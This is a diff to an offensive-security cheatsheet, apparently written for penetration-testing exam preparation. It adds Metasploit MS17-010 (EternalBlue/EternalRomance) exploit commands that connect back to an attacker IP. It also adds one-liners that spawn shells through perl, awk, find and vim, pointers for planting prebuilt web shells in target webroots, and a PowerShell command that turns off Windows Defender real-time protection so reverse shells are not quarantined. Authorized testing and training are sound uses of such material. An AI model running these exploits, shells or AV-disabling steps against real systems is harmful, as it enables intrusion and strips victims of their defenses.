@@ -95,6 +95,7 @@
     - `4.1.3` impacket-smbexec
   - `4.2` **Metasploit**
     - `4.2.1` psexec module
+    - `4.2.2` MS17-010 (EternalBlue / EternalRomance)
   - `4.3` **RDP**
     - `4.3.1` xfreerdp
   - `4.4` **Shell Access**
@@ -102,6 +103,7 @@
     - `4.4.2` Bind shells
     - `4.4.3` Web shells
     - `4.4.4` TTY upgrade
+    - `4.4.5` Shell spawning via scripting languages
   - `4.5` **File Transfer (Windows & Linux)**
     - `4.5.1` Base64 encode/decode
     - `4.5.2` Web download/upload (HTTP/HTTPS)
@@ -164,7 +166,10 @@
     - `8.2.12` UNIX socket file-descriptor passing (SCM_RIGHTS)
   - `8.3` **Privesc Resources**
   - `8.4` **Windows — Token Escalation (Meterpreter)**
-- `9` **Useful Resources**
+- `9` **Defense Evasion — AV / EDR Manipulation**
+  - `9.1` **Windows Defender**
+    - `9.1.1` Disable real-time monitoring
+- `10` **Useful Resources**
 
 ## 1. Host Discovery
 
@@ -2144,6 +2149,59 @@ run
 
 </details>
 
+#### 4.2.2 MS17-010 (EternalBlue / EternalRomance)
+
+**Check if vulnerable (non-destructive):**
+
+```
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS <TARGET_IP>
+run
+```
+
+**Exploit — EternalRomance (`ms17_010_psexec`, preferred):**
+
+```
+use exploit/windows/smb/ms17_010_psexec
+set RHOSTS <TARGET_IP>
+set LHOST <ATTACKER_IP>
+set LPORT 4444
+run
+```
+
+**Exploit — EternalBlue (`ms17_010_eternalblue`):**
+
+```
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <TARGET_IP>
+set LHOST <ATTACKER_IP>
+set LPORT 4444
+run
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- MS17-010 remote code execution against unpatched Windows (Server 2008/2012/R2, Windows 7) over SMBv1.
+- `smb_ms17_010` is the non-destructive auxiliary check — run it before attempting either exploit.
+- **Prefer `ms17_010_psexec` (EternalRomance/EternalSynergy) over `ms17_010_eternalblue`.** The EternalBlue path commonly fails with `triggering free of corrupted buffer`, especially against x86 targets, where the psexec variant succeeds.
+
+**Parameters**
+
+- `RHOSTS` — Target IP address.
+- `LHOST` — Attacker IP reachable from the target.
+- `LPORT` — Listener port.
+- `TARGET` — `ms17_010_psexec` exposes a target list; run `show targets` and set it explicitly if `Automatic` fails.
+
+**Notes**
+
+- Requires SMBv1 reachable on TCP/445; if both modules fail, fall back to `exploit/windows/smb/smb_doublepulsar_rce`.
+- Only lands on unpatched Server 2008/2012/R2 or Windows 7 — later builds are patched.
+
+</details>
+
 ### 4.3 RDP
 
 #### 4.3.1 xfreerdp
@@ -2180,6 +2238,8 @@ xfreerdp /v:<TARGET_IP> /u:.\<USERNAME> /p:'<PASSWORD>' /cert:ignore
 
 ### 4.4 Shell Access
 
+**Reference:** [InternalAllTheThings — Shell & Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) — additional one-liners for reverse/bind shells and shell upgrades across languages.
+
 #### 4.4.1 Reverse shells
 
 **Listener (attacker):**
@@ -2214,6 +2274,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',
 - The reverse shell connects back to the attacker's listener, giving interactive command execution on the target.
 - The mkfifo variant is more reliable under adverse conditions than bash's `/dev/tcp` pseudo-device.
 - The PowerShell variant uses `System.Net.Sockets.TCPClient` for an interactive PowerShell session.
+- If the payload is blocked or deleted by host AV, disable real-time protection first (9.1.1).
 
 **Netcat Options**
 
@@ -2283,6 +2344,12 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.So
 
 **Default webroots:** Apache `/var/www/html/`, Nginx `/usr/local/nginx/html/`, IIS `c:\inetpub\wwwroot\`, XAMPP `C:\xampp\htdocs\`.
 
+**Prebuilt shells (Laudanum):** Kali ships the Laudanum project's ready-made web shells under `/usr/share/laudanum` — copy the relevant one (php/asp/aspx/jsp) to the target webroot, and set the `allowedip` variable inside it to your attacker IP before use.
+
+**Antak (Nishang):** ASP.NET PowerShell web shell — [github.com/samratashok/nishang](https://github.com/samratashok/nishang), installed on Kali at `/usr/share/nishang/Antak-WebShell/antak.aspx`.
+
+**wwwolf (PHP):** feature-rich PHP web shell — [github.com/WhiteWinterWolf/wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell).
+
 <details>
 <summary>Details</summary>
 
@@ -2317,6 +2384,55 @@ stty rows <ROWS> columns <COLS>
 - Upgrades a limited netcat shell to a full TTY with tab completion, arrow keys, and job control.
 - Run `stty size` in a second local terminal to get the correct `<ROWS>` and `<COLS>` values.
 - Without this step, the shell is line-based and fragile; with it, it behaves like SSH.
+
+</details>
+
+#### 4.4.5 Shell spawning via scripting languages
+
+Use when you have command execution but no shell, or as a fallback when `python` is absent (4.4.4).
+
+**sh:**
+```bash
+/bin/sh -i
+```
+
+**Perl:**
+```bash
+perl -e 'exec "/bin/sh";'
+```
+
+**Ruby:**
+```bash
+ruby -e 'exec "/bin/sh"'
+```
+
+**Lua:**
+```bash
+lua -e 'os.execute("/bin/sh")'
+```
+
+**AWK:**
+```bash
+awk 'BEGIN {system("/bin/sh")}'
+```
+
+**Find:**
+```bash
+find . -exec /bin/sh \; -quit
+```
+
+**Vim:**
+```bash
+vim -c ':!/bin/sh'
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Spawns an interactive shell through an interpreter already present on the host.
+- The `find`/`vim` variants are handy when common interpreters are restricted (see GTFOBins in 10).
 
 </details>
 
@@ -3090,7 +3206,7 @@ Both commands prompt for a password.
 
 #### 4.5.12 Living off the Land (LOLBAS / GTFOBins) file transfer
 
-Use binaries already present on the target instead of dropping our own tooling. The two aggregators are **LOLBAS** (Windows binaries, https://lolbas-project.github.io/) and **GTFOBins** (Linux binaries, https://gtfobins.github.io/) — both linked in 9. Useful Resources (also referenced for privesc in 8.3). Filter by function: LOLBAS uses `/download` and `/upload`; GTFOBins uses `+file download` and `+file upload`.
+Use binaries already present on the target instead of dropping our own tooling. The two aggregators are **LOLBAS** (Windows binaries, https://lolbas-project.github.io/) and **GTFOBins** (Linux binaries, https://gtfobins.github.io/) — both linked in 10. Useful Resources (also referenced for privesc in 8.3). Filter by function: LOLBAS uses `/download` and `/upload`; GTFOBins uses `+file download` and `+file upload`.
 
 **Upload — Windows target (certreq.exe, LOLBAS):**
 
@@ -3172,7 +3288,7 @@ openssl s_client -connect <ATTACKER_IP>:80 -quiet > <FILE>
 - BITS "intelligently" throttles to minimize impact on foreground work, so transfers may be slow.
 - If PowerShell/Netcat are blocked by application whitelisting or flagged by command-line logging, a LoL bin may be permitted and unalerted — audit the environment (LOLBAS `/download`, GTFOBins `+file download`) for a suitable download binary.
 - Consider changing the HTTP User-Agent to a browser string to evade UA-based detection (see 4.5.2 and blue-team-methodology.md 8.3).
-- GTFOBins/LOLBAS also document execution, file read/write, and bypass primitives beyond transfers — see 8.3 (Privesc Resources) and 9 (Useful Resources) for the links.
+- GTFOBins/LOLBAS also document execution, file read/write, and bypass primitives beyond transfers — see 8.3 (Privesc Resources) and 10 (Useful Resources) for the links.
 
 </details>
 
@@ -4342,7 +4458,37 @@ getuid
 
 </details>
 
-## 9. Useful Resources
+## 9. Defense Evasion — AV / EDR Manipulation
+
+Weakening or disabling host security controls (AV, EDR, AMSI) so payloads and shells execute reliably. Apply after obtaining a shell (4.4) and before downloading or running tooling — otherwise the payload may be quarantined on write or on execution.
+
+### 9.1 Windows Defender
+
+#### 9.1.1 Disable real-time monitoring
+
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Disables Defender's real-time protection so payloads (e.g. the reverse shell in 4.4.1) are not quarantined when downloaded or executed.
+- Requires an elevated (Administrator) PowerShell session.
+- Not persistent across reboots, and Defender may re-enable itself — re-run as needed.
+- Tamper Protection, when enabled, blocks this and other `Set-MpPreference` changes.
+- Verify the effect before continuing; if real-time protection stays on, fall back to an AMSI/EDR bypass (see LOLBAS/GTFOBins in 4.5.12).
+
+**Commands**
+
+- `Set-MpPreference -DisableRealtimeMonitoring $true` — Turns off Defender real-time protection.
+- `Get-MpComputerStatus` — Confirms Defender status (`RealTimeProtectionEnabled`).
+
+</details>
+
+## 10. Useful Resources
 
 | Resource | Purpose |
 |---|---|
@@ -4354,3 +4500,6 @@ getuid
 | [CPTS Cheatsheet](https://github.com/zagnox/CPTS-cheatsheet) | HTB CPTS exam cheatsheet |
 | [GTFOBins](https://gtfobins.github.io/) | Abusable Unix binaries — file download/upload, execution, file read/write, bypasses |
 | [LOLBAS](https://lolbas-project.github.io/) | Living-off-the-land Windows binaries — same functions, per-binary |
+| [InternalAllTheThings — Shell & Reverse Shell Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) | Reverse/bind shell one-liners and shell upgrades across languages |
+| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) | Payloads and one-liners across web, shells, privesc, and more (also referenced in 8.3) |
+| [IppSec.rocks](https://ippsec.rocks) | Search engine for IppSec's Hack The Box video walkthroughs — find the exact technique you need |
